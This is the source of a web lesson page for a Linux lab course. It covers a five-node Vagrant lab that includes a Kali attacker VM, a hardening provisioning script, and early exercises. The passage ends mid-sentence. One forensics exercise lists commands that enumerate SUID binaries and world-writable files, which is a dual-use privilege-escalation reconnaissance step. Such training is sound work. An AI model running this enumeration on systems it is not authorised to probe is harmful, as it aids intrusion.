import LessonDocument from "./LessonDocument";

const styles = "@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Rajdhani:wght@400;500;600;700&display=swap');\n*{box-sizing:border-box;margin:0;padding:0}\n:root{\n  --bg:#0a0c0f;--bg3:#111820;--panel:#131a22;--panel2:#1a2332;\n  --b:#1e3a5f;--b2:#0f2540;\n  --g:#00ff88;--c:#00d4ff;--y:#ffd700;--o:#ff8c00;--r:#ff3b3b;--p:#9d4edd;\n  --t:#c8d8e8;--t2:#7a9bb5;--t3:#4a6a85;\n  --mono:'JetBrains Mono',monospace;--sans:'Rajdhani','Segoe UI',sans-serif;\n}\nbody{background:var(--bg);color:var(--t);font-family:var(--mono);font-size:13px;line-height:1.6;overflow-x:hidden}\nbody::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.01) 2px,rgba(0,255,136,.01) 4px);pointer-events:none;z-index:9999}\n.wrap{max-width:1100px;margin:0 auto;padding:20px 16px}\n.panel{background:var(--panel);border:1px solid var(--b2);margin-bottom:14px;overflow:hidden}\n.ph{background:var(--panel2);border-bottom:1px solid var(--b);padding:8px 16px;display:flex;align-items:center;gap:10px}\n.pt{font-family:var(--sans);font-size:13px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:var(--c)}\n.pn{margin-left:auto;font-size:10px;color:var(--t3);letter-spacing:1px}\n.pb{padding:18px 20px}\n@keyframes pulse{0%,100%{box-shadow:0 0 6px var(--g)}50%{box-shadow:0 0 18px var(--g);opacity:.5}}\n.g2{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px}\n.g3{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px}\n.g4{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}\n.cb{background:var(--bg3);border:1px solid var(--b2);padding:14px}\n.cbl{border-left:3px solid var(--c)}.cbg{border-left:3px solid var(--g)}.cby{border-left:3px solid var(--y)}.cbp{border-left:3px solid var(--p)}.cbo{border-left:3px solid var(--o)}.cbr{border-left:3px solid var(--r)}\n.cbt{font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px}\n.cbl .cbt{color:var(--c)}.cbg .cbt{color:var(--g)}.cby .cbt{color:var(--y)}.cbp .cbt{color:var(--p)}.cbo .cbt{color:var(--o)}.cbr .cbt{color:var(--r)}\n.ct{color:var(--t);font-size:12.5px;line-height:1.7}\n.term{background:#050810;border:1px solid #1a2d45;overflow:hidden}\n.tbar{background:#0d1520;border-bottom:1px solid #1a2d45;padding:7px 14px;display:flex;align-items:center;gap:8px}\n.td{width:10px;height:10px;border-radius:50%}\n.tb{padding:14px 18px;font-size:12px;line-height:1.8}\n.pr{color:var(--g)}\n.sec{display:block;color:var(--t3);font-size:10px;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a2d45;padding-top:10px;margin:10px 0 4px}\n.out{display:block;color:var(--t2)}.ocn{display:block;color:var(--c)}.oyn{display:block;color:var(--y)}.ogn{display:block;color:var(--g)}.ored{display:block;color:var(--r)}.opu{display:block;color:var(--p)}\n.info{display:flex;gap:8px;padding:8px 12px;background:rgba(0,212,255,.06);border-left:3px solid var(--c);margin:10px 0;font-size:12px;color:var(--t2)}\n.warn{display:flex;gap:8px;padding:8px 12px;background:rgba(255,215,0,.06);border-left:3px solid var(--y);margin:10px 0;font-size:12px;color:var(--t2)}\n.good{display:flex;gap:8px;padding:8px 12px;background:rgba(0,255,136,.06);border-left:3px solid var(--g);margin:10px 0;font-size:12px;color:var(--t2)}\n.tag{padding:2px 8px;border-radius:2px;font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;font-family:var(--sans)}\n.tg{background:rgba(0,255,136,.12);color:var(--g);border:1px solid rgba(0,255,136,.3)}\n.tc{background:rgba(0,212,255,.1);color:var(--c);border:1px solid rgba(0,212,255,.3)}\n.ty{background:rgba(255,215,0,.1);color:var(--y);border:1px solid rgba(255,215,0,.3)}\n.tp{background:rgba(157,78,221,.12);color:var(--p);border:1px solid rgba(157,78,221,.3)}\n.to{background:rgba(255,140,0,.1);color:var(--o);border:1px solid rgba(255,140,0,.3)}\n.tr2{background:rgba(255,59,59,.1);color:var(--r);border:1px solid rgba(255,59,59,.3)}\n.hl{color:var(--g);font-weight:600}.hc{color:var(--c)}.hy{color:var(--y)}.ho{color:var(--o)}.hp{color:var(--p)}.hr{color:var(--r)}\n.div{height:1px;background:linear-gradient(to right,transparent,var(--b),transparent);margin:10px 0}\n/* lab specific */\n.node-box{background:var(--bg3);border:1px solid var(--b2);padding:12px 14px;text-align:center;flex:1;min-width:130px}\n.nb-icon{font-size:22px;margin-bottom:4px}\n.nb-name{font-family:var(--sans);font-size:12px;font-weight:700;margin-bottom:3px}\n.nb-ip{font-family:var(--mono);font-size:11px;color:var(--c)}\n.nb-spec{font-size:10px;color:var(--t3);margin-top:3px}\n.nb-arrow{padding:0 4px;color:var(--t3);font-size:14px;flex-shrink:0;display:flex;align-items:center}\n/* exercise cards */\n.ex-card{background:var(--bg3);border:1px solid var(--b2);border-left:3px solid;padding:14px;margin-bottom:10px}\n.ex-num{font-family:var(--sans);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}\n.ex-title{font-family:var(--sans);font-size:14px;font-weight:700;margin-bottom:6px}\n.ex-body{font-size:12px;color:var(--t2);line-height:1.7;margin-bottom:8px}\n.ex-task{background:var(--bg);padding:6px 12px;font-size:11px;margin:3px 0;color:var(--t2)}\n.ex-task::before{content:\"→ \";color:var(--g)}\n.ex-verify{margin-top:8px;background:var(--bg);padding:6px 12px;border-left:2px solid var(--y);font-size:11px;color:var(--y)}\n/* phase timeline */\n.phase{display:flex;gap:14px;align-items:flex-start;position:relative;margin-bottom:0}\n.phase-line{position:absolute;left:15px;top:32px;bottom:-10px;width:1px;background:linear-gradient(to bottom,var(--g),transparent)}\n.phase-dot{width:32px;min-width:32px;height:32px;border-radius:50%;border:2px solid var(--g);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--g);background:rgba(0,255,136,.08);flex-shrink:0;font-family:var(--sans)}\n.phase-body{flex:1;background:var(--bg3);border:1px solid var(--b2);padding:10px 14px;margin-bottom:10px}\n.phase-title{font-family:var(--sans);font-weight:600;font-size:13px;color:var(--g);margin-bottom:3px}\n.phase-desc{font-size:11.5px;color:var(--t2)}\n.phase-cmd{margin-top:5px;background:var(--bg);padding:3px 10px;font-size:11px;color:var(--c);border-left:2px solid var(--c)}\n/* option cards */\n.opt-card{background:var(--bg3);border:1px solid var(--b2);padding:14px}\n.oc-icon{font-size:24px;margin-bottom:6px}\n.oc-name{font-family:var(--sans);font-weight:700;font-size:13px;margin-bottom:3px}\n.oc-diff{font-size:10px;font-family:var(--sans);font-weight:600;letter-spacing:1px;margin-bottom:6px}\n.oc-body{font-size:11.5px;color:var(--t2);line-height:1.6}\n/* test result */\n.test-row{display:flex;align-items:flex-start;gap:10px;padding:6px 0;border-bottom:1px solid var(--b2);font-size:12px}\n.test-status{width:22px;height:22px;min-width:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;margin-top:1px}\n.ts-pass{background:rgba(0,255,136,.15);color:var(--g);border:1px solid rgba(0,255,136,.4)}\n.ts-fail{background:rgba(255,59,59,.15);color:var(--r);border:1px solid rgba(255,59,59,.4)}\n.ts-warn{background:rgba(255,215,0,.15);color:var(--y);border:1px solid rgba(255,215,0,.4)}\n.test-name{flex:1;color:var(--t)}\n.test-cmd{font-size:10px;color:var(--t3);margin-top:2px;font-family:var(--mono)}";
const markup = "<div class=\"wrap\">\n\n<!-- HEADER -->\n<div style=\"background:linear-gradient(135deg,#0d1a2e,#0a1520);border:1px solid var(--b);border-top:3px solid var(--g);padding:20px 24px;margin-bottom:16px;position:relative;overflow:hidden\">\n  <div style=\"position:absolute;right:-60px;top:-60px;width:200px;height:200px;background:radial-gradient(circle,rgba(0,255,136,.05),transparent 70%);pointer-events:none\"></div>\n  <div style=\"display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px\">\n    <div>\n      <div style=\"display:flex;align-items:center;gap:8px;margin-bottom:6px\">\n        <div style=\"width:8px;height:8px;border-radius:50%;background:var(--g);animation:pulse 2s infinite\"></div>\n        <span style=\"font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:var(--g)\">LAB MODULE ● HANDS-ON PRACTICAL</span>\n      </div>\n      <h1 style=\"font-family:var(--sans);font-size:26px;font-weight:700;color:#fff;letter-spacing:1px;line-height:1.2\">Linux <span style=\"color:var(--g)\">Lab Setup</span> &amp; Practical Tests</h1>\n      <div style=\"display:flex;flex-wrap:wrap;gap:8px;margin-top:10px\">\n        <span class=\"tag tg\">⊕ Environment Setup</span>\n        <span class=\"tag tc\">⊞ 5-Node Lab Topology</span>\n        <span class=\"tag ty\">⊛ 12 Practical Exercises</span>\n        <span class=\"tag tp\">⬡ Automated Test Suite</span>\n        <span class=\"tag to\">⊘ CTF-Style Challenges</span>\n      </div>\n    </div>\n    <div style=\"text-align:right;font-size:11px;color:var(--t3);line-height:1.9;font-family:var(--mono)\">\n      <div>TYPE: <span style=\"color:var(--c)\">Hands-On Lab</span></div>\n      <div>DURATION: <span style=\"color:var(--c)\">8–16 hours</span></div>\n      <div>DIFFICULTY: <span style=\"color:var(--c)\">L5–L7</span></div>\n      <div>PANELS: <span style=\"color:var(--c)\">10</span></div>\n      <div style=\"margin-top:6px;font-size:10px;color:#1e6a3a\">▓▓▓▓▓▓▓▓▓▓ LAB READY</div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 01 — ENVIRONMENT OPTIONS -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🖥</span><span class=\"pt\">Lab Environment Options — Choose Your Setup</span><span class=\"pn\">PANEL 01</span></div>\n  <div class=\"pb\">\n    <div class=\"info\"><span style=\"color:var(--c);flex-shrink:0\">ℹ</span><span>You need <strong style=\"color:var(--c)\">at least one Linux VM</strong> for individual exercises, and <strong style=\"color:var(--c)\">3–5 VMs</strong> for the full enterprise lab topology. All options below work — choose based on your host OS and hardware.</span></div>\n\n    <div class=\"g4\" style=\"margin-bottom:14px\">\n      <div class=\"opt-card\">\n        <div class=\"oc-icon\">📦</div>\n        <div class=\"oc-name\" style=\"color:var(--g)\">VirtualBox</div>\n        <div class=\"oc-diff\" style=\"color:var(--g)\">RECOMMENDED — BEGINNER</div>\n        <div class=\"oc-body\">Free, works on Windows/macOS/Linux. GUI for creating VMs. Supports snapshots, NAT networking, host-only adapters. Ideal for multi-VM labs.</div>\n      </div>\n      <div class=\"opt-card\">\n        <div class=\"oc-icon\">⚡</div>\n        <div class=\"oc-name\" style=\"color:var(--c)\">KVM / libvirt</div>\n        <div class=\"oc-diff\" style=\"color:var(--c)\">RECOMMENDED — LINUX HOST</div>\n        <div class=\"oc-body\">Best performance on Linux. Native hypervisor. Use virt-manager for GUI or virsh CLI. Near-bare-metal speed. Already covered in Step 10.</div>\n      </div>\n      <div class=\"opt-card\">\n        <div class=\"oc-icon\">🐳</div>\n        <div class=\"oc-name\" style=\"color:var(--y)\">WSL2 + Docker</div>\n        <div class=\"oc-diff\" style=\"color:var(--y)\">QUICK START — WINDOWS HOST</div>\n        <div class=\"oc-body\">WSL2 gives real Linux kernel on Windows. Docker Desktop for containers. Good for individual exercises. Limited for full HA/networking labs.</div>\n      </div>\n      <div class=\"opt-card\">\n        <div class=\"oc-icon\">☁️</div>\n        <div class=\"oc-name\" style=\"color:var(--o)\">Oracle Cloud Free Tier</div>\n        <div class=\"oc-diff\" style=\"color:var(--o)\">FREE CLOUD — ALWAYS-ON</div>\n        <div class=\"oc-body\">4 Ampere A1 cores + 24GB RAM free forever. Perfect for persistent lab. Public IP. Real SSH practice. Deploy full topology here.</div>\n      </div>\n      <div class=\"opt-card\">\n        <div class=\"oc-icon\">🚀</div>\n        <div class=\"oc-name\" style=\"color:var(--p)\">Vagrant + VirtualBox</div>\n        <div class=\"oc-diff\" style=\"color:var(--p)\">AUTOMATED — REPRODUCIBLE</div>\n        <div class=\"oc-body\">Vagrantfile describes entire lab. <code>vagrant up</code> creates 5 VMs in minutes. Destroy and rebuild instantly. Best for repeatable lab exercises.</div>\n      </div>\n      <div class=\"opt-card\">\n        <div class=\"oc-icon\">🎮</div>\n        <div class=\"oc-name\" style=\"color:var(--r)\">TryHackMe / HackTheBox</div>\n        <div class=\"oc-diff\" style=\"color:var(--r)\">ONLINE — SECURITY FOCUS</div>\n        <div class=\"oc-body\">Browser-based Linux rooms. Pre-configured vulnerable machines. Great for practising Steps 4, 6, 7 (security). No setup required.</div>\n      </div>\n    </div>\n\n    <!-- Minimum specs -->\n    <div class=\"g2\">\n      <div class=\"cb cby\">\n        <div class=\"cbt\">Minimum Host Hardware</div>\n        <div class=\"ct\" style=\"font-size:12px;line-height:1.9\">\n          <span class=\"hy\">RAM:</span> 16GB (8GB minimum for 1 VM)<br>\n          <span class=\"hy\">CPU:</span> 4 cores, VT-x/AMD-V enabled in BIOS<br>\n          <span class=\"hy\">Disk:</span> 100GB free (50GB minimum)<br>\n          <span class=\"hy\">OS:</span> Windows 10/11, macOS 12+, or Linux<br><br>\n          <span class=\"hl\">Check VT-x on Windows:</span><br>\n          Task Manager → Performance → CPU → Virtualisation: Enabled\n        </div>\n      </div>\n      <div class=\"cb cbg\">\n        <div class=\"cbt\">Recommended VM Specs</div>\n        <div class=\"ct\" style=\"font-size:12px;line-height:1.9\">\n          <span class=\"hl\">lab-web</span> — 2 vCPU, 2GB RAM, 20GB disk<br>\n          <span class=\"hl\">lab-db</span> — 2 vCPU, 4GB RAM, 30GB disk<br>\n          <span class=\"hl\">lab-lb</span> — 1 vCPU, 1GB RAM, 10GB disk<br>\n          <span class=\"hl\">lab-monitor</span> — 2 vCPU, 3GB RAM, 20GB disk<br>\n          <span class=\"hl\">lab-attacker</span> — 2 vCPU, 2GB RAM, 20GB disk (Kali)<br><br>\n          <span class=\"hc\">Total:</span> 9 vCPU, 12GB RAM, 100GB disk\n        </div>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 02 — LAB TOPOLOGY -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🗺</span><span class=\"pt\">Lab Network Topology — 5-Node Enterprise Setup</span><span class=\"pn\">PANEL 02</span></div>\n  <div class=\"pb\">\n    <!-- Network diagram -->\n    <div style=\"background:var(--bg);border:1px solid var(--b2);padding:16px;margin-bottom:14px\">\n      <div style=\"font-family:var(--sans);font-size:10px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:12px\">Lab Network: 192.168.100.0/24 (Host-Only)</div>\n\n      <!-- Internet/Host -->\n      <div style=\"text-align:center;margin-bottom:8px\">\n        <div style=\"display:inline-block;background:rgba(157,78,221,.1);border:1px solid rgba(157,78,221,.3);padding:8px 20px;font-family:var(--sans);font-weight:700;font-size:12px;color:var(--p)\">\n          🖥 HOST MACHINE — Your Laptop/Desktop\n        </div>\n      </div>\n      <div style=\"text-align:center;color:var(--t3);font-size:11px;padding:4px\">↕ Host-Only Adapter (192.168.100.1)</div>\n\n      <!-- LB -->\n      <div style=\"display:flex;justify-content:center;gap:6px;margin-bottom:6px;flex-wrap:wrap\">\n        <div class=\"node-box\" style=\"border-top:2px solid var(--c);max-width:180px\">\n          <div class=\"nb-icon\">⚖️</div>\n          <div class=\"nb-name\" style=\"color:var(--c)\">lab-lb</div>\n          <div class=\"nb-ip\">192.168.100.10</div>\n          <div class=\"nb-spec\">HAProxy + Keepalived<br>Ubuntu 24.04 LTS</div>\n        </div>\n      </div>\n      <div style=\"text-align:center;color:var(--t3);font-size:11px;padding:4px\">↓ routes to</div>\n\n      <!-- App nodes -->\n      <div style=\"display:flex;justify-content:center;gap:6px;margin-bottom:6px;flex-wrap:wrap\">\n        <div class=\"node-box\" style=\"border-top:2px solid var(--g)\">\n          <div class=\"nb-icon\">🌐</div>\n          <div class=\"nb-name\" style=\"color:var(--g)\">lab-web</div>\n          <div class=\"nb-ip\">192.168.100.20</div>\n          <div class=\"nb-spec\">nginx + app server<br>Ubuntu 24.04 LTS</div>\n        </div>\n        <div class=\"node-box\" style=\"border-top:2px solid var(--y)\">\n          <div class=\"nb-icon\">🗄️</div>\n          <div class=\"nb-name\" style=\"color:var(--y)\">lab-db</div>\n          <div class=\"nb-ip\">192.168.100.30</div>\n          <div class=\"nb-spec\">PostgreSQL 16<br>Ubuntu 24.04 LTS</div>\n        </div>\n        <div class=\"node-box\" style=\"border-top:2px solid var(--o)\">\n          <div class=\"nb-icon\">📈</div>\n          <div class=\"nb-name\" style=\"color:var(--o)\">lab-monitor</div>\n          <div class=\"nb-ip\">192.168.100.40</div>\n          <div class=\"nb-spec\">Prometheus + Grafana<br>Ubuntu 24.04 LTS</div>\n        </div>\n        <div class=\"node-box\" style=\"border-top:2px solid var(--r)\">\n          <div class=\"nb-icon\">⚔️</div>\n          <div class=\"nb-name\" style=\"color:var(--r)\">lab-attacker</div>\n          <div class=\"nb-ip\">192.168.100.99</div>\n          <div class=\"nb-spec\">Kali Linux<br>(Red Team practice)</div>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">Vagrant — spin up entire lab with one command</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── Vagrantfile — FULL LAB DEFINITION ────</span>\n        <span class=\"oyn\">Vagrant.configure(\"2\") do |config|</span>\n        <span class=\"oyn\">  config.vm.box = \"ubuntu/jammy64\"</span>\n        <span class=\"out\"></span>\n        <span class=\"oyn\">  # Load Balancer</span>\n        <span class=\"out\">  config.vm.define \"lab-lb\" do |lb|</span>\n        <span class=\"out\">    lb.vm.hostname = \"lab-lb\"</span>\n        <span class=\"out\">    lb.vm.network \"private_network\", ip: \"192.168.100.10\"</span>\n        <span class=\"ocn\">    lb.vm.provider \"virtualbox\" do |v| v.memory=1024; v.cpus=1 end</span>\n        <span class=\"out\">    lb.vm.provision \"shell\", path: \"provision/lb.sh\"</span>\n        <span class=\"out\">  end</span>\n        <span class=\"oyn\">  # Web Server</span>\n        <span class=\"out\">  config.vm.define \"lab-web\" do |web|</span>\n        <span class=\"out\">    web.vm.hostname = \"lab-web\"</span>\n        <span class=\"out\">    web.vm.network \"private_network\", ip: \"192.168.100.20\"</span>\n        <span class=\"ocn\">    web.vm.provider \"virtualbox\" do |v| v.memory=2048; v.cpus=2 end</span>\n        <span class=\"out\">    web.vm.provision \"shell\", path: \"provision/web.sh\"</span>\n        <span class=\"out\">  end</span>\n        <span class=\"oyn\">  # Database</span>\n        <span class=\"out\">  config.vm.define \"lab-db\" do |db|</span>\n        <span class=\"out\">    db.vm.hostname = \"lab-db\"</span>\n        <span class=\"out\">    db.vm.network \"private_network\", ip: \"192.168.100.30\"</span>\n        <span class=\"ocn\">    db.vm.provider \"virtualbox\" do |v| v.memory=4096; v.cpus=2 end</span>\n        <span class=\"out\">    db.vm.provision \"shell\", path: \"provision/db.sh\"</span>\n        <span class=\"out\">  end</span>\n        <span class=\"oyn\">  # Monitoring</span>\n        <span class=\"out\">  config.vm.define \"lab-monitor\" do |mon|</span>\n        <span class=\"out\">    mon.vm.network \"private_network\", ip: \"192.168.100.40\"</span>\n        <span class=\"ocn\">    mon.vm.provider \"virtualbox\" do |v| v.memory=3072; v.cpus=2 end</span>\n        <span class=\"out\">  end</span>\n        <span class=\"oyn\">  # Kali Attacker</span>\n        <span class=\"out\">  config.vm.define \"lab-attacker\" do |atk|</span>\n        <span class=\"out\">    atk.vm.box = \"kalilinux/rolling\"</span>\n        <span class=\"out\">    atk.vm.network \"private_network\", ip: \"192.168.100.99\"</span>\n        <span class=\"out\">  end</span>\n        <span class=\"oyn\">end</span>\n        <span class=\"sec\">──── START LAB ────</span>\n        <span><span class=\"pr\">host:~$ </span><span style=\"color:#fff\">vagrant up                    # creates all 5 VMs</span></span>\n        <span><span class=\"pr\">host:~$ </span><span style=\"color:#fff\">vagrant ssh lab-web            # SSH into web server</span></span>\n        <span><span class=\"pr\">host:~$ </span><span style=\"color:#fff\">vagrant snapshot save lab-web fresh-install  # snapshot before experiments</span></span>\n        <span><span class=\"pr\">host:~$ </span><span style=\"color:#fff\">vagrant snapshot restore lab-web fresh-install  # restore if broken</span></span>\n        <span><span class=\"pr\">host:~$ </span><span style=\"color:#fff\">vagrant destroy -f && vagrant up  # full reset</span></span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 03 — BASE PROVISIONING SCRIPT -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">⚙</span><span class=\"pt\">Base Provisioning — Bootstrap Every Lab Node</span><span class=\"pn\">PANEL 03</span></div>\n  <div class=\"pb\">\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">provision/base.sh — run on every node after first boot</span></div>\n      <div class=\"tb\">\n        <span class=\"oyn\">#!/bin/bash</span>\n        <span class=\"oyn\">set -euo pipefail</span>\n        <span class=\"out\">echo \"=== Base provisioning: $(hostname) ===\"</span>\n        <span class=\"sec\">──── 1. UPDATE & ESSENTIALS ────</span>\n        <span class=\"out\">export DEBIAN_FRONTEND=noninteractive</span>\n        <span class=\"out\">apt update -qq && apt upgrade -y -qq</span>\n        <span class=\"out\">apt install -y -qq \\</span>\n        <span class=\"ocn\">  curl wget git vim tmux tree htop iotop nethogs \\</span>\n        <span class=\"ocn\">  net-tools dnsutils nmap tcpdump \\</span>\n        <span class=\"ocn\">  build-essential strace lsof auditd \\</span>\n        <span class=\"ocn\">  ufw fail2ban aide logrotate \\</span>\n        <span class=\"ocn\">  jq python3 python3-pip unzip</span>\n        <span class=\"sec\">──── 2. /etc/hosts (lab DNS) ────</span>\n        <span class=\"oyn\">cat >> /etc/hosts << EOF</span>\n        <span class=\"oyn\">192.168.100.10  lab-lb</span>\n        <span class=\"oyn\">192.168.100.20  lab-web</span>\n        <span class=\"oyn\">192.168.100.30  lab-db</span>\n        <span class=\"oyn\">192.168.100.40  lab-monitor</span>\n        <span class=\"oyn\">192.168.100.99  lab-attacker</span>\n        <span class=\"oyn\">EOF</span>\n        <span class=\"sec\">──── 3. SSH HARDENING ────</span>\n        <span class=\"oyn\">sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config</span>\n        <span class=\"oyn\">sed -i 's/#MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config</span>\n        <span class=\"oyn\">sed -i 's/X11Forwarding yes/X11Forwarding no/' /etc/ssh/sshd_config</span>\n        <span class=\"oyn\">systemctl reload sshd</span>\n        <span class=\"sec\">──── 4. FIREWALL BASELINE ────</span>\n        <span class=\"oyn\">ufw default deny incoming</span>\n        <span class=\"oyn\">ufw default allow outgoing</span>\n        <span class=\"oyn\">ufw allow 22/tcp comment \"SSH\"</span>\n        <span class=\"oyn\">ufw --force enable</span>\n        <span class=\"sec\">──── 5. AUDITD RULES ────</span>\n        <span class=\"oyn\">cat > /etc/audit/rules.d/99-lab.rules << 'RULES'</span>\n        <span class=\"oyn\">-w /etc/passwd  -p wa -k identity</span>\n        <span class=\"oyn\">-w /etc/shadow  -p wa -k identity</span>\n        <span class=\"oyn\">-w /etc/sudoers -p wa -k sudoers</span>\n        <span class=\"oyn\">-a always,exit -F arch=b64 -S execve -F euid=0 -k root_cmds</span>\n        <span class=\"oyn\">RULES</span>\n        <span class=\"oyn\">augenrules --load && systemctl enable --now auditd</span>\n        <span class=\"sec\">──── 6. KERNEL HARDENING ────</span>\n        <span class=\"oyn\">cat > /etc/sysctl.d/99-lab-hardening.conf << 'SYSCTL'</span>\n        <span class=\"oyn\">kernel.dmesg_restrict = 1</span>\n        <span class=\"oyn\">kernel.kptr_restrict = 2</span>\n        <span class=\"oyn\">kernel.randomize_va_space = 2</span>\n        <span class=\"oyn\">net.ipv4.tcp_syncookies = 1</span>\n        <span class=\"oyn\">net.ipv4.conf.all.rp_filter = 1</span>\n        <span class=\"oyn\">fs.protected_hardlinks = 1</span>\n        <span class=\"oyn\">fs.protected_symlinks = 1</span>\n        <span class=\"oyn\">SYSCTL</span>\n        <span class=\"oyn\">sysctl --system -q</span>\n        <span class=\"sec\">──── 7. AIDE BASELINE ────</span>\n        <span class=\"oyn\">aide --init 2>/dev/null && mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db</span>\n        <span class=\"out\">echo \"=== Base provisioning complete ===\"</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 04 — PRACTICAL EXERCISES (Steps 1-6) -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🧪</span><span class=\"pt\">Practical Exercises — Steps 1–6 (Kernel to Networking)</span><span class=\"pn\">PANEL 04</span></div>\n  <div class=\"pb\">\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--c)\">\n      <div class=\"ex-num\" style=\"color:var(--c)\">LAB 01 — SYSTEM EXPLORATION</div>\n      <div class=\"ex-title\" style=\"color:var(--c)\">Map the entire system — from CPU to kernel to processes</div>\n      <div class=\"ex-body\">SSH into lab-web. Without looking up answers, document the system: kernel version, distro, CPU architecture, loaded modules, running process tree, all open ports, all listening sockets, and the path every packet takes from <code>curl lab-lb</code> to nginx.</div>\n      <div class=\"ex-task\">uname -a; cat /etc/os-release; lscpu | grep -E \"Arch|CPU|Model\"</div>\n      <div class=\"ex-task\">lsmod | head -15; pstree -p | head -20</div>\n      <div class=\"ex-task\">ss -tlnp; ip route show; ip addr show</div>\n      <div class=\"ex-task\">strace -c curl http://lab-lb 2>&1 | tail -10   # trace syscalls</div>\n      <div class=\"ex-verify\">✓ VERIFY: Can you explain where nginx is in the process tree, which FDs are open, and what the default route is?</div>\n    </div>\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--g)\">\n      <div class=\"ex-num\" style=\"color:var(--g)\">LAB 02 — FILESYSTEM FORENSICS</div>\n      <div class=\"ex-title\" style=\"color:var(--g)\">Investigate every directory and permission in the system</div>\n      <div class=\"ex-body\">On lab-web: find all SUID binaries, all world-writable files, all files modified in the last 24 hours, and the inode of /etc/passwd. Explain the permission string of every file in /usr/bin/sudo's directory.</div>\n      <div class=\"ex-task\">find / -perm -4000 -type f 2>/dev/null | sort</div>\n      <div class=\"ex-task\">find / -perm -002 -not -path '/proc/*' -type f 2>/dev/null</div>\n      <div class=\"ex-task\">find / -newer /etc/passwd -not -path '/proc/*' -type f 2>/dev/null | head -20</div>\n      <div class=\"ex-task\">stat /etc/passwd; ls -lai /etc/passwd; df -i /</div>\n      <div class=\"ex-verify\">✓ VERIFY: Did you find any unexpected SUID binaries? Any world-writable files outside /tmp? Note them.</div>\n    </div>\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--y)\">\n      <div class=\"ex-num\" style=\"color:var(--y)\">LAB 03 — USER & PERMISSION MANAGEMENT</div>\n      <div class=\"ex-title\" style=\"color:var(--y)\">Build a multi-user environment with proper access controls</div>\n      <div class=\"ex-body\">Create users: alice (developer), bob (read-only auditor), carol (deploy account). Set up a /shared/project directory where alice has rwx, bob has r-x, carol has rwx, but no other users. Use ACLs. Then prove bob cannot delete alice's files.</div>\n      <div class=\"ex-task\">useradd -m -s /bin/bash alice bob carol</div>\n      <div class=\"ex-task\">mkdir -p /shared/project && chmod 750 /shared/project</div>\n      <div class=\"ex-task\">setfacl -m u:alice:rwx,u:bob:r-x,u:carol:rwx /shared/project</div>\n      <div class=\"ex-task\">setfacl -d -m u:alice:rwx,u:bob:r-x,u:carol:rwx /shared/project</div>\n      <div class=\"ex-task\">su - bob -c \"rm /shared/project/alice_file.txt\" 2>&1   # should fail</div>\n      <div class=\"ex-verify\">✓ VERIFY: getfacl /shared/project shows correct ACLs. Bob cannot delete alice's files. Carol can write.</div>\n    </div>\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--o)\">\n      <div class=\"ex-num\" style=\"color:var(--o)\">LAB 04 — SERVICE MANAGEMENT & SYSTEMD</div>\n      <div class=\"ex-title\" style=\"color:var(--o)\">Deploy a hardened web application as a systemd service</div>\n      <div class=\"ex-body\">Create a Python Flask app that serves /health (returns 200 OK) on port 8080. Write a production systemd unit with: non-root user, PrivateTmp, NoNewPrivileges, ProtectSystem=strict, MemoryMax=256M, Restart=on-failure. Verify it restarts automatically when killed.</div>\n      <div class=\"ex-task\">python3 -c \"from flask import Flask; app=Flask(__name__); app.route('/health')(lambda: 'OK'); app.run(port=8080)\"</div>\n      <div class=\"ex-task\">vim /etc/systemd/system/labapp.service  # write hardened unit</div>\n      <div class=\"ex-task\">systemctl enable --now labapp && systemctl status labapp</div>\n      <div class=\"ex-task\">kill -9 $(pgrep -f labapp) && sleep 3 && systemctl status labapp</div>\n      <div class=\"ex-verify\">✓ VERIFY: systemd-analyze security labapp.service shows low exposure score. Service auto-restarts after kill.</div>\n    </div>\n\n    <div class=\"ex-card\" style=\"border-left-color:var(--p)\">\n      <div class=\"ex-num\" style=\"color:var(--p)\">LAB 05 — NETWORKING & FIREWALL</div>\n      <div class=\"ex-title\" style=\"color:var(--p)\">Configure full 